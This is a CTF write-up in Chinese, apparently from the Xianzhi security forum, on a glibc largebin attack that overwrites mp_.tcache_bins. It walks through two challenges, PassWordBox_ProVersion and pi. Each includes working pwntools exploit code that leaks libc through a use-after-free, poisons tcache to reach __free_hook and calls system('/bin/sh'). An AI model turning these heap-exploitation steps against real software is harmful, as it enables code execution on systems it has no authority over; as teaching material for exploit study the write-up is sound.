

# Tcache Attack 之攻击 mp_ - 先知社区

Tcache Attack 之攻击 mp\_

- - -

# tcache attack 之攻击 mp\_

#### 漏洞原理：

###### **large bin&mp\_.tcache\_bins 的利用：**

```bash
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;

/* maintain large bins in sorted order */
if (fwd != bck)
  {
    /* Or with inuse bit to speed comparisons */
    size |= PREV_INUSE;
    /* if smaller than smallest, bypass loop below */
    assert (chunk_main_arena (bck->bk));
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
      {
        fwd = bck;
        bck = bck->bk;

        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
      }
```

当我们申请的大小 usroted bin 中现有的堆块的时候，glibc 会首先将 unsorted bin 中的堆块放到相应的链表中，这一部分的代码就是将堆块放到 large bin 链表中的操作。当 unsorted bin 中的堆块的大小小于 large bin 链表中对应链中堆块的最小 size 的时候就会执行上述的代码

```bash
if (__glibc_unlikely (size <= 2 * SIZE_SZ)
    || __glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): invalid size (unsorted)");
if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
  malloc_printerr ("malloc(): invalid next size (unsorted)");
if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
  malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
if (__glibc_unlikely (bck->fd != victim)
    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
  malloc_printerr ("malloc(): unsorted double linked list corrupted");
if (__glibc_unlikely (prev_inuse (next)))
  malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```

看前面也没有针对 fd\_nextsize 和 bk\_nextsize 的检查，也就是说虽然已经针对 fd 和 bk 进行了双向链表的检查

但是在 large bin 链表中并没有堆 fd\_nextsize 和 bk\_nextsize 进行双向链表完整性的检查

通过 largebin attcak 覆写 tcache 部分的 mp\_.tcache\_bins 的值为一个很大的地址

mp\_.tcache\_bins 的作用就相当于是 global max fast，将其改成一个很大的地址之后，再次释放的堆块就会当作 tcache 来进行处理，也就是我们可以直接进行任意地址分配

‍

#### 例题 PassWordBox\_ProVersion

###### 程序分析：

[![](assets/1700442753-18d16bc0a61b643f7200c2a6ba94a475.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185415-a6432242-8537-1.png)

[![](assets/1700442753-f4105afc58651d2d0c74dcf872eeb3c3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185419-a889b962-8537-1.png)

首先就是输入 id，然后输入一个 size 分配我们指定大小的堆块，接着将我们输入的 passwd 字符串加密存储在刚刚申请的堆块上

这里需要注意的是这里的 size 存在一个大小范围也就是 `0x41f<size<0x888` ，那么这里申请的大小在释放的时候就无法进入到 tcache 和 fastbin 以及 small bin 链表中，也就是说我们申请的都是 large bin 大小的堆块

[![](assets/1700442753-28c0d85551683bcda9e4d09fd8fa24f8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185425-abfd633c-8537-1.png)

edit 函数就是按照之前我们申请的大小，向相应的堆空间中输入内容

[![](assets/1700442753-0fb1458b4f7fb231671b11d4a9671c1e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185428-ae3eeb5c-8537-1.png)

show 函数就是将堆块中的内容进行一个解密操作进行输出，接着是 delete 函数

[![](assets/1700442753-0ef94cb02dc553f512a0455ecddd2c2c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185432-b097f880-8537-1.png)

delete 函数就是将我们指定的堆块释放掉，这里在释放时候为 dword\_407C 相应的内容赋值了 0，那么这里就不存在一个 UAF 的漏洞

[![](assets/1700442753-67a2e4aeac4682cbb19373c862f42108.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185436-b2de77b8-8537-1.png)

recover 函数是将 dword\_407C 中的位又重新置为了 1，并且这里并没有进行堆块是否已经被释放了的检查，也就是说这里其实存在一个 UAF 的漏洞，我们可以在释放堆块之后，再调用 recover 函数，就可以利用 UAF

[![](assets/1700442753-db80d0adab5260d683e58d6fa34b7c1e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185440-b50519ac-8537-1.png)

‍

###### 攻击思路：

我们可以通过改写 large bin 的 bk\_nextsize 的值来想指定的位置 +0x20 的位置写入一个堆地址，也就是这里存在一个任意地址写堆地址的漏洞

覆写 malloc 中使用 tcache 部分的 mp\_.tcache\_bins 的值为一个很大的地址

之后覆写 free\_hook 为 system，进而 getshell

‍

###### 覆写 mp\_.tcache\_bins 的攻击手段需要两个条件：

1.可以申请 largebin 大小的堆块

2.存在 UAF 漏洞

‍

###### 具体步骤：

泄漏出的地址是加密之后。这个加密算法是一个简单的异或，通过将前 8 位全部置为 0，泄漏得到的就是异或的 key，之后异或解密就能拿到 libc 的基地址

```bash
add(0,0x460,"\n")
ru("Save ID:")
key = uu64(r(8))
leak("key",key)
```

获取 libc 基址：

[![](assets/1700442753-486db8143ef016e3df59639819f0a145.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185446-b8b80884-8537-1.png)

```bash
add(1,0x450,"\n")
add(2,0x450,"\n")

free(0)
recover(0)
show(0)

ru("Pwd is: ")
libc_base = (u64(r(8)) ^ key) - (0x7f4eed4e1b80-0x7f4eed2f5000) - 106
leak("base = ",libc_base)
```

将 chunk 0 放入 largebin 中

```bash
add(3,0x600,"\n")
```

Tcache Struct 劫持的准备：

```bash
mp_ = libc_base + 0x1EC280 
leak("mp_ = ",mp_)

#bins = mp_ + 80
#max = mp_ + 88
tcache_max_bins = mp_+80

free_hook =  libc_base+libc.sym["__free_hook"]
system =  libc_base+libc.sym["system"]
```

[![](assets/1700442753-d61aa81e373e98ba839b24cde1bb547f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185451-bb831a7c-8537-1.png)

```bash
free(2)
recover(2)
#将 chunk 2 放入 unsorted bin 中
```

[![](assets/1700442753-0780006312dd6645560eb0b5072ab1f8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185456-be9a2f3e-8537-1.png)

```bash
edit(0,p64(0)*3+p64(tcache_max_bins-0x20))
#修改 chunk 0 的 bk_nextsize 为_mp+80 - 0x20 处，来达到任意地址写一个堆块地址
```

[![](assets/1700442753-4ffccf32f2bb28f592e38f6af2177831.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185500-c0df5e72-8537-1.png)

```bash
add(4,0x600,"\n")
#申请一个大堆块触发漏洞
```

[![](assets/1700442753-722d008768c89d3aa70746c2a4d393d9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185503-c2ff79b2-8537-1.png)

```bash
free(1)

free(2)
recover(2)
#large bin 大小范围的 chunk 1、2 被释放也会放到 tcache bin 中

edit(2,p64(free_hook))
#利用 uaf 达到任意地址写
```

[![](assets/1700442753-e1e1950b7c599ca91843fe18b08064d5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185522-ce795628-8537-1.png)

```bash
add(1,0x450,'\n')
add(2,0x450,'\n')
edit(2,p64(system))
edit(1,b'/bin/sh\x00')
#dbg()
free(1)
```

[![](assets/1700442753-537a951fcb97480d72a5705e3928ca06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185518-cbca6c82-8537-1.png)

‍

‍

#### 例题 pi

###### 程序分析：

另一道有些相似的堆，同样的利用手法

[![](assets/1700442753-a41eff2eb32a460eca7a52a8af994485.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185529-d25452a2-8537-1.png)

限制大小 0x41F 到 0x550

[![](assets/1700442753-57e34ef36919d84bbd8483ed925830f6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185532-d41cd0b4-8537-1.png)

存在 UAF 漏洞，和上一题的处理思路类似

[![](assets/1700442753-d056b356b59fb9d29fe2da22c033b119.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231117185535-d62388a8-8537-1.png)

##### exp:

```bash
def dbg():
   gdb.attach(proc.pidof(s)[0])
   pause()

def add(size,index,content):
    s.recvuntil(b'>> ')
    s.sendline(b'1')
    s.recvuntil(b'HOw much?\n')
    s.sendline(str(size))
    s.recvuntil(b'which?\n')
    s.sendline(str(index))
    s.recvuntil('Content:\n')
    s.sendline(content)

def delete(index):
    s.recvuntil(b'>> ')
    s.sendline(b'2')
    s.recvuntil(b'which one?\n')
    s.sendline(str(index))

def show(index):
    s.recvuntil(b'>> ')
    s.sendline(b'3')
    s.recvuntil(b'which one?\n')
    s.sendline(str(index))  

def edit(index,content):
    s.recvuntil(b'>> ')
    s.sendline(b'4')
    s.recvuntil(b'which one?\n')
    s.sendline(str(index))
    s.recvuntil('content:\n')
    s.sendline(content)    

# 0x415(1055) <= size < 0x550(1360)

add(0x460 ,0,b'a') 
add(0x450,1,b'b') 
add(0x450,2,b'c') 
#add(0x500,3,b'd')


delete(0)
show(0)
libc_base = 0x7fff00000000 + 0xF7E45420 - libc.sym['puts']
li('libc_base = '+hex(libc_base))
libcbase = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
li('libcbase = '+hex(libcbase))

add(0x540,4,b'a') #largebin

delete(2)

show(2)
heap = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
li('heap = '+hex(heap))

mp = libcbase + 0x1EC280
#dbg()
#mp_.tcache_bins = 0x7ffff7fad2d0
#mp_.tcache_max_bytes = 0x7ffff7fad2d8
tcache_max_bins = libcbase + 0x1EC2D0
li('tcache_max_bins = '+hex(tcache_max_bins))
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']

pl = p64(0)*3+p64(tcache_max_bins-0x20)

edit(0,pl)

add(0x540,6,"b") #largebin attack
delete(1)
delete(2)

edit(2,p64(free_hook))

add(0x450,5,b'/bin/sh\x00')

add(0x450,6,p64(system))
#dbg()
delete(5)
```

‍

‍

![](assets/1700442753-c1a690c3008373b105f447e452f0cfec.gif)附件.zip (0.83 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231117185341-920dca34-8537-1.zip)
